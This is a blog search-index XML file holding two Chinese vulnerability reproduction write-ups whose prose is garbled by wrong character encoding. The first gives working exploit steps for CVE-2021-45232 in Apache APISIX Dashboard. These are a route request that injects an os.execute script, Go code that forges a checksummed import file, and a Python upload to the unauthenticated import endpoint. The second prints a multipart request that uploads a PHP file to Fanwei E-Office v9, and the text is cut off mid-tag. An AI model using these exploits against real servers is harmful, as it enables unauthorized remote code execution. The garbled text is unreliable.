<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/01/11/1/"/>
      <url>/2022/01/11/1/</url>
      
        <content type="html"><![CDATA[<h3 id="Apache-APISIXä»‹ç»"><a href="#Apache-APISIXä»‹ç»" class="headerlink" title="Apache APISIXä»‹ç»"></a>Apache APISIXä»‹ç»</h3><p>Apache APISIXæ˜¯ä¸€ä¸ªåŠ¨æ€ã€å®æ—¶ã€é«˜æ€§èƒ½çš„APIç½‘å…³ã€‚æä¾›äº†ä¸°å¯Œçš„æµé‡ç®¡ç†åŠŸèƒ½ï¼Œå¦‚è´Ÿè½½å‡è¡¡ã€åŠ¨æ€ä¸Šæ¸¸ã€canaryé‡Šæ”¾ã€æ–­è·¯ã€è®¤è¯ã€å¯è§‚å¯Ÿæ€§ç­‰ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨Apache APISIXæ¥å¤„ç†ä¼ ç»Ÿçš„å—åŒ—å‘æµé‡ï¼Œä»¥åŠæœåŠ¡ä¹‹é—´çš„ä¸œè¥¿å‘æµé‡ã€‚å®ƒä¹Ÿå¯ä»¥ç”¨ä½œk8sçš„ingressæ§åˆ¶å™¨ã€‚</p><h3 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h3><p>è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯ç”±äº Manager API ä¸­çš„é”™è¯¯ã€‚Manager API åœ¨ gin æ¡†æ¶çš„åŸºç¡€ä¸Šå¼•å…¥äº† droplet æ¡†æ¶ï¼Œæ‰€æœ‰çš„ API å’Œé‰´æƒä¸­é—´ä»¶éƒ½æ˜¯åŸºäº droplet æ¡†æ¶å¼€å‘çš„ã€‚ä½†æ˜¯æœ‰äº› API ç›´æ¥ä½¿ç”¨äº†æ¡†æ¶ gin çš„æ¥å£ï¼Œä»è€Œç»•è¿‡èº«ä»½éªŒè¯ã€‚CVEç¼–å·ä¸ºï¼š<code>CVE-2021-45232</code></p><p>æœªæˆæƒè®¿é—®API:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/apisix/admin/migrate/export</span><br><span class="line">/apisix/admin/migrate/import</span><br></pre></td></tr></table></figure><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>Apache APISIX Dashboard &lt; 2.10.1</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/apisix-docker</span><br><span class="line">cd apisix-docker/example/</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹docker-compose.ymlï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apache/apisix-dashboard:2.7</span></span><br><span class="line"><span class="attribute">apache/apisix:2.6-alpine</span></span><br></pre></td></tr></table></figure><p>å¾ˆå¤šæ–‡ç« åªæ˜¯ä¿®æ”¹äº†ç¬¬ä¸€å¤„ï¼Œå¦‚æœåªä¿®æ”¹ç¬¬ä¸€å¤„çš„è¯ï¼Œåˆ™ä¼šå› ä¸ºå¯¹åº”çš„ç‰ˆæœ¬å·å¯¹ä¸ä¸Šï¼Œè€Œå¯¼è‡´ç™»å½•æŠ¥é”™ã€‚</p><p><img src="1.assets/image-20220111141421592.png" alt="image-20220111141421592"></p><p><img src="1.assets/image-20220111142145490.png" alt="image-20220111142145490"></p><p>æ¥ç€é€šè¿‡docker-composeæ­å»ºå³å¯</p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ¼æ´ç¯å¢ƒæ­å»ºæˆåŠŸåï¼Œé€šè¿‡é»˜è®¤ç«¯å£9000è®¿é—®Webç•Œé¢</p><p><img src="1.assets/image-20220111144106921.png" alt="image-20220111144106921"></p><h4 id="åå°RCE"><a href="#åå°RCE" class="headerlink" title="åå°RCE"></a>åå°RCE</h4><p>å…¶å®å¦‚æœæ²¡æœ‰æœªæˆæƒè®¿é—®çš„è¯ï¼Œä¹Ÿæ˜¯å¯ä»¥å…ˆé€šè¿‡å¼±å¯†ç ç™»å½•åå°è¿›è¡ŒRCEçš„ï¼Œæ¥ä¸‹æ¥æ¼”ç¤ºå¦‚ä½•è¿›å…¥åå°è¿›è¡ŒRCEã€‚</p><p>é¦–å…ˆé»˜è®¤å¯†ç admin/adminè¿›å…¥åå°</p><p><img src="1.assets/image-20220111144804335.png" alt="image-20220111144804335"></p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªä¸Šæ¸¸æœåŠ¡</p><p><img src="1.assets/image-20220111145019905.png" alt="image-20220111145019905"></p><p>ç‚¹å‡»åˆ›å»ºï¼Œåç§°å¯ä»¥éšæ„å‘½åï¼Œç„¶åç›®æ ‡èŠ‚ç‚¹å¡«çš„æ˜¯æˆ‘ä»¬è½¬å‘è¯·æ±‚çš„æœåŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬å¡«dockeré™„å¸¦çš„Grafanaåº”ç”¨ï¼Œç«¯å£å·ä¸º3000</p><p><img src="1.assets/image-20220111145423288.png" alt="image-20220111145423288"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œæäº¤å³å¯ã€‚</p><p>æ¥ç€å†åˆ›å»ºä¸€ä¸ªè·¯ç”±</p><p><img src="1.assets/image-20220111145544412.png" alt="image-20220111145544412"></p><p>åç§°éšä¾¿èµ·ï¼Œç„¶åè·¯å¾„ä¹Ÿæ˜¯å¯ä»¥è‡ªå®šä¹‰ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="1.assets/image-20220111145707728.png" alt="image-20220111145707728"></p><p>é€‰æ‹©æˆ‘ä»¬åˆšæ‰åˆ›å»ºçš„ä¸Šæ¸¸æœåŠ¡</p><p><img src="1.assets/image-20220111145828262.png" alt="image-20220111145828262"></p><p>æ¥ä¸‹æ¥ï¼Œé»˜è®¤æäº¤å³å¯ã€‚</p><p><img src="1.assets/image-20220111145908526.png" alt="image-20220111145908526"></p><p>åˆ›å»ºçš„è·¯ç”±é…ç½®å¦‚ä¸‹:</p><p><img src="1.assets/image-20220111152207632.png" alt="image-20220111152207632"></p><p>åˆ›å»ºè·¯ç”±æˆåŠŸåï¼Œå›åˆ°è·¯ç”±é…ç½®ç•Œé¢ï¼Œç‚¹å‡»é…ç½®æŒ‰é’®ï¼Œç›´æ¥ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œåˆ°æŒ‰ä¸‹æäº¤æŒ‰é’®æ—¶ä½¿ç”¨BurpæŠ“åŒ…</p><p><img src="1.assets/image-20220111150211016.png" alt="image-20220111150211016"></p><p>ç„¶åæ·»åŠ ä¸€ä¸ªscriptå­—æ®µï¼Œå¦‚ä¸‹:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/apisix/admin/routes/389826569650045636</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 172.21.1.158:9000</span><br><span class="line"><span class="attribute">Content-Length</span>: 197</span><br><span class="line"><span class="attribute">Accept</span>: application/json</span><br><span class="line"><span class="attribute">Origin</span>: http://172.21.1.158:9000</span><br><span class="line"><span class="attribute">Authorization</span>: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDE4ODcyNzQsImlhdCI6MTY0MTg4MzY3NCwic3ViIjoiYWRtaW4ifQ.m63RB9tu28GHzwT0D_jGbAAmzLQ7FgMIvjr6ze-EtE0</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span>: http://172.21.1.158:9000/routes/389826569650045636/edit</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"uris":["/RCE123"],"methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"priority":0,"name":"A1LB1ue_route","status":1,"labels":&#123;&#125;,"script": "os.execute('touch /tmp/Keepb1ue')","upstream_id":"389826160386638532"&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œè¿™é‡ŒURLåé¢routes/åçš„æ•°å­—æ˜¯æ¥è‡ªåˆ›å»ºçš„è·¯ç”±IDï¼Œè€Œä¸‹é¢çš„upstream_idæ˜¯æ¥è‡ªåˆ›å»ºçš„ä¸Šæ¸¸æœåŠ¡IDï¼Œéœ€è¦è‡ªè¡Œå¯¹åº”ã€‚</p><p><img src="1.assets/image-20220111150706728.png" alt="image-20220111150706728"></p><p>Runä¹‹åï¼Œåœ¨çœ‹ä¸‹é…ç½®ï¼š</p><p><img src="1.assets/image-20220111152002246.png" alt="image-20220111152002246"></p><p>æ¥ç€æˆ‘ä»¬è®¿é—®ä¸€ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://172.21.1.158:9080/RCE123</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼šä¸æ˜¯è®¿é—®å½“å‰çš„9000ç«¯å£çš„ï¼Œè€Œæ˜¯è®¿é—®ç®¡ç†çš„apache/apisix çš„9080ç«¯å£ã€‚</p><p>è®¿é—®åï¼Œå†åˆ°dockerä¸­å»æŸ¥çœ‹æ˜¯å¦åˆ›å»ºäº†Keepb1ueè¿™ä¸ªæ–‡ä»¶è¿›è¡ŒéªŒè¯</p><p><img src="1.assets/image-20220111151427140.png" alt="image-20220111151427140"></p><h4 id="æœªæˆæƒæ¥å£RCE"><a href="#æœªæˆæƒæ¥å£RCE" class="headerlink" title="æœªæˆæƒæ¥å£RCE"></a>æœªæˆæƒæ¥å£RCE</h4><p>é‚£å¦‚æœæ²¡æœ‰é»˜è®¤å¯†ç æˆ–è€…å¼±å¯†ç çš„è¯ï¼Œè¿™æ—¶æˆ‘ä»¬å°±åˆ©ç”¨æœªæˆæƒæ¥å£è¿›è¡ŒRCEäº†</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/apisix/admin/migrate/export</span><br><span class="line">/apisix/admin/migrate/import</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸¤ä¸ªæ¥å£ä¸€ä¸ªæ˜¯ç”¨æ¥å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ç”¨æ¥å¯¼å…¥é…ç½®æ–‡ä»¶çš„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>/apisix/admin/migrate/export</code>ç›´æ¥å¯¼å‡ºé…ç½®æ–‡ä»¶</p><p>æˆ‘ä»¬å¯ä»¥å°è¯•è®¿é—®ä¸‹ï¼Œå½“ç„¶æˆ‘ä»¬åˆ©ç”¨çš„æ˜¯æœªæˆæƒæ¥å£ï¼Œè‡ªç„¶æ˜¯ä¸ç”¨ç™»å½•</p><p><img src="1.assets/image-20220111152557344.png" alt="image-20220111152557344"></p><p>è®¿é—®å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼Œè¿™é‡Œä»”ç»†çœ‹ï¼Œåé¢å¤šå‡ºå››ä¸ªå­—èŠ‚ï¼Œè¿™4ä¸ªå­—èŠ‚å…¶å®æ˜¯é…ç½®æ–‡ä»¶çš„checksumå€¼</p><p>åœ¨å¯¼å…¥é…ç½®æ–‡ä»¶æ—¶ï¼Œä¼šå¯¹é…ç½®æ–‡ä»¶çš„checksumå€¼è¿›è¡Œæ ¡éªŒï¼Œé‚£è¿™é‡Œå…¶å®æ˜¯å¯ä»¥é€šè¿‡å†™è„šæœ¬ç®—å‡ºchecksumæ ¡éªŒå€¼ï¼Œæˆ–è€…æ˜¯æ ¹æ®apisixçš„æºç å»è®¡ç®—å‡ºæ–°çš„checksumå€¼</p><p>æºç ä½ç½®åœ¨ï¼šapisix-dashboard-master\api\internal\handler\migrate\migrate.goçš„<code>ExportConfig</code>å‡½æ•°</p><p>å°†å…¶è®¡ç®—æºç å•ç‹¬æŠ½å–å‡ºæ¥</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/binary"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"hash/crc32"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gen()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gen</span><span class="params">()</span></span> &#123;</span><br><span class="line">    data := []<span class="keyword">byte</span>(<span class="string">`&#123;"Counsumers":[],"Routes":[&#123;"id":"389828862525047492","create_time":1641885708,"update_time":1641885708,"uris":["/RCE123"],"name":"Keepb1ue_route","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('touch /tmp/A1LB1ue')","script_id":"389792240563651268","upstream_id":"389828818199642820","status":1&#125;],"Services":[],"SSLs":[],"Upstreams":[&#123;"id":"389828818199642820","create_time":1641885682,"update_time":1641885682,"nodes":[&#123;"host":"172.21.1.158","port":3000,"weight":1&#125;],"timeout":&#123;"connect":6,"read":6,"send":6&#125;,"type":"roundrobin","scheme":"http","pass_host":"pass","name":"upstream"&#125;],"Scripts":[&#123;"id":"389792240563651268","script":"os.execute('touch /tmp/A1LB1ue')"&#125;],"GlobalPlugins":[],"PluginConfigs":[]&#125;`</span>)</span><br><span class="line">    checksumUint32 := crc32.ChecksumIEEE(data)</span><br><span class="line">    checksumLength := <span class="number">4</span></span><br><span class="line">    checksum := <span class="built_in">make</span>([]<span class="keyword">byte</span>, checksumLength)</span><br><span class="line">    binary.BigEndian.PutUint32(checksum, checksumUint32)</span><br><span class="line">    fileBytes := <span class="built_in">append</span>(data, checksum...)</span><br><span class="line"></span><br><span class="line">    content := fileBytes</span><br><span class="line">    fmt.Println(content)</span><br><span class="line"></span><br><span class="line">    importData := content[:<span class="built_in">len</span>(content)<span class="number">-4</span>]</span><br><span class="line">    checksum2 := binary.BigEndian.Uint32(content[<span class="built_in">len</span>(content)<span class="number">-4</span>:])</span><br><span class="line">    <span class="keyword">if</span> checksum2 != crc32.ChecksumIEEE(importData) &#123;</span><br><span class="line">        fmt.Println(checksum2)</span><br><span class="line">        fmt.Println(crc32.ChecksumIEEE(importData))</span><br><span class="line">        fmt.Println(<span class="string">"Check sum check fail, maybe file broken"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    err := ioutil.WriteFile(<span class="string">"apisixPayload"</span>, content, os.ModePerm)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"error!!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†éœ€è¦å¯¼å…¥çš„é…ç½®è¿›è¡Œæ›¿æ¢ï¼Œå¹¶æ’å…¥RCEè¯­å¥</p><p>æ¥ç€è¿è¡Œè¿™æ®µè„šæœ¬ï¼Œä¼šç”ŸæˆapisixPayloadè¿™ä¸ªæ–‡ä»¶</p><p><img src="1.assets/image-20220111154814331.png" alt="image-20220111154814331"></p><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¦importä¸Šå»çš„è®¡ç®—å¥½æ ¡éªŒå€¼çš„æ–°çš„é…ç½®æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨pythonä»£ç å¯ä»¥ç®€å•çš„ä¼ åˆ°æœåŠ¡ç«¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://172.21.1.158:9000/apisix/admin/migrate/import"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>: open(<span class="string">"apisixPayload"</span>, <span class="string">"rb"</span>)&#125;</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">"mode"</span>: <span class="string">"overwrite"</span>&#125;, files=files)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><p><img src="1.assets/image-20220111154421044.png" alt="image-20220111154421044"></p><p>å¾ˆå¥½ï¼Œæ²¡æœ‰æŠ¥æ ¡éªŒå€¼é”™è¯¯ã€‚</p><p>æ¥ä¸‹æ¥è®¿é—®è·¯ç”±åœ°å€å³å¯å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://172.21.1.158:9080/RCE123</span></span><br></pre></td></tr></table></figure><p><img src="1.assets/image-20220111155455950.png" alt="image-20220111155455950"></p><p><img src="1.assets/image-20220111154908020.png" alt="image-20220111154908020"></p><p>åœ¨è¿™é‡Œæ¨èä¸‹githubå¤§ä½¬å†™çš„æ˜¯å¸¦å›æ˜¾çš„å¯ä»¥æ‰§è¡Œå¤šæ¬¡å‘½ä»¤çš„æ¥å£é…ç½®é¡¹ç›®</p><p><a href="https://github.com/wuppp/cve-2021-45232-exp#readme" target="_blank" rel="noopener">https://github.com/wuppp/cve-2021-45232-exp#readme</a></p><p><a href="https://github.com/allblue147/cve-2021-45232-exp" target="_blank" rel="noopener">https://github.com/allblue147/cve-2021-45232-exp</a></p><p><img src="1.assets/image-20220111155409256.png" alt="image-20220111155409256"></p><h3 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h3><p>æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œæ–°ç‰ˆæœ¬ä»£ç†åšäº†é‰´æƒå¤„ç†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/11/28/%E6%9F%90%E6%B3%9B%E5%BE%AE%20E-Office%20v9%20%E8%A2%AB%E6%8D%95%E8%8E%B7%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1/"/>
      <url>/2021/11/28/%E6%9F%90%E6%B3%9B%E5%BE%AE%20E-Office%20v9%20%E8%A2%AB%E6%8D%95%E8%8E%B7%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´é¢„è­¦ï¼šæŸ-E-Office-v9-è¢«æ•è·çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ"><a href="#æ¼æ´é¢„è­¦ï¼šæŸ-E-Office-v9-è¢«æ•è·çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´é¢„è­¦ï¼šæŸ E-Office v9 è¢«æ•è·çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ"></a>æ¼æ´é¢„è­¦ï¼šæŸ E-Office v9 è¢«æ•è·çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ</h1><p>åŸåˆ› PeiQiæ–‡åº“ <a href="javascript:void(0" target="_blank" rel="noopener">PeiQiæ–‡åº“</a>;)</p><p><strong>PeiQiæ–‡åº“</strong></p><p>å¾®ä¿¡å· PeiQi_wiki</p><p>åŠŸèƒ½ä»‹ç» ä¹Œæ‹‰ä¹Œæ‹‰ï¼</p><p>_æ˜¨å¤©_</p><p>æ”¶å½•äºè¯é¢˜ #æ¼æ´åˆ†æ 86ä¸ªå†…å®¹</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt></p><p><strong><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>ä¸€**</strong>ï¼šæ¼æ´æè¿°ğŸ‘**</p><p>çœ‹æœ‹å‹åœˆçš„æ—¶å€™å‘ç°éƒ½è½¬å‘äº†ä¸€æ¡æ¼æ´é¢„è­¦</p><p><a href="https://mp.weixin.qq.com/s/P75K\_0869h-nWHRMu06zgQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/P75K\_0869h-nWHRMu06zgQ</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MMiaR8fQyEKMFDFKqZUBkEphYbgvDWBTA3BG4PKvbml2BaoW2F8HG29Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>äºŒ:  æ¼æ´å½±å“ğŸ‡</p><p>æ³›å¾® e-office v9.0</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>ä¸‰:  æ¼æ´å¤ç°ğŸ‹</p><p>æ ¹æ®æ¼æ´é¢„è­¦çš„å›¾ç‰‡ä¿®å¤æè¿°æ¥çœ‹ä¸€ä¸‹æºä»£ç </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MUFEuOVicEypveLGwo0pWsbSemToAIll83a8K6153NBIwZ7OQu9s5W1A/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt>  </p><p>å­˜åœ¨æ¼æ´çš„æºä»£ç ä½ç½®ï¼Œä¸»è¦æ˜¯æºäº uploadType å‚æ•°è®¾ä¸º eoffice_logo æ—¶ï¼Œå¯¹æ–‡ä»¶æ²¡æœ‰æ ¡éªŒï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼   </p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MkbOfn9vPE1sTKGgGLicIVibNAibl2vH5GgwOB2GfYVJiafnq8xvN92LS8Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>è°ƒç”¨æ–¹æ³• uploadPicture</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MgDc5rmJngPYA6AchtTxk2H2fSoJp3QP2icyWWuxQicrwcyG1dRHicwTew/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>æ„é€ è¯·æ±‚ä¸Šä¼ æ–‡ä»¶å³å¯</p><pre><code>POST /general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId= HTTP/1.1Host: 127.0.0.1:7899User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36Accept-Encoding: gzip, deflateAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Connection: closeAccept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348Content-Length: 193Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4--e64bdf16c554bbc109cecef6451c26a4Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;test.php&quot;Content-Type: image/jpeg&lt;?php phpinfo();?&gt;--e64bdf16c554bbc109cecef6451c26a4--</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MAXYCsbxD8JjNibBmIv4nLYtwOg6A6oQk7l1PHH6SmHyn3NL7jQTCuMQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>ä¸Šä¼ æˆåŠŸåè®¿é—® /images/logo/logo-eoffice.php</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MAnsr7GVQe9tqFDRPezT3ribmIRT8xY36fbLonlNiayr4jwJ2mUETC2WQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img 